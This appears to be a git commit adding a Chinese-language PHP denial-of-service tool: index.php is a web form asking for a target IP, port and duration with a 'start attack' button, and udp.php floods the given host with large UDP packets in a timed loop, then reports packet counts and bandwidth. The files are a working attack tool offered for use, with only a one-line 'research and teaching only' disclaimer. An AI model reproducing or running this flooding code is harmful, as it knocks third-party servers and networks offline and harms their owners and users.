5cdf47b335fd9b4f10bf4e74969ed65914daf66a
ChinaCY <w@54cy.cc>
2016-09-17 17:49:45 +0800

    Add files via upload

---
+++ index.php
@@ -0,0 +1,47 @@
+﻿<?php
+$ip = $_SERVER['REMOTE_ADDR'];
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="author" content="">
+<title>PHP DoS, Coded by EXE</title>
+</head>
+<!-- PHP DOS, coded by EXE -->
+<style type="text/css">
+<!--
+body {
+font-family: Arial, Helvetica, sans-serif;
+font-size: 12px;
+font-style: normal;
+line-height: normal;
+color: #FFFFFF;
+background-color: #000000;
+}
+-->
+</style>
+<!-- PHP DOS, coded by EXE -->
+<body>
+<center><br><br>
+<br>
+<b>你的 IP:</b> <font color="red"><?php echo $ip; ?></font> (请勿以你的ip作为攻击目标)<br>
+<br>
+<form name="input" action="function.php" method="post">
+IP:
+<input type="text" name="ip" size="15" maxlength="15" value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';">
+    Time:
+<input type="text" name="time" size="14" maxlength="20" value = "时间(单位秒)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';">
+    Port:
+<input type="text" name="port" size="5" maxlength="5" value = "端口" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';">
+<br><br>
+<input type="submit" value=" 开始攻击---> ">
+<br><br>
+<center>
+发起DOS攻击后，请等待浏览器加载
+</center>
+</form>
+</center>
+<!-- PHP DOS, coded by EXE -->
+</body>
+</html>
---
+++ udp.php
@@ -0,0 +1,35 @@
+﻿<?php
+$packets = 0;
+$ip = $_GET['ip'];
+$port = $_GET['port'];
+set_time_limit(0);
+ignore_user_abort(FALSE);
+$exec_time = $_GET['time'];
+$time = time();
+print "状态 : 正常运行中.....<br>";
+$max_time = $time+$exec_time;
+for($i=0;$i<65535;$i++){
+        $out .= "phpddos";
+}
+while(1){
+$packets++;
+        if(time() > $max_time){
+                break;
+        }
+ 
+        $fp = fsockopen("udp://$ip", $port, $errno, $errstr, 5);
+        if($fp){
+                fwrite($fp, $out);
+                fclose($fp);
+        }
+}
+echo "================================================<br>";
+echo "  <font color=blue>www.phpddos.com<br>";
+echo "  作者：ybhacker<br>";
+echo "  警告：本程序带有攻击性,仅供安全研究与教学之用,风险自负!</font><br>";
+echo "================================================<br><br>";
+echo "  攻击包总数：<font color=Red><span class=\"text\">".$packets." 个数据包</span><br><br></font>";
+echo "	攻击总流量：<font color=Red><span class=\"text\">".round(($packets*65*8)/(1024*1024),2)." Mbps</span><br><br></font>";
+echo "  攻击总字节：<font color=Red><span class=\"text\">".time('h:i:s')." 字节</span><br><br></font>";
+echo "Packet complete at ".time('h:i:s')." with $packets (" .round(($packets*65*8)/(1024*1024),2). " Mbps) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
+?>
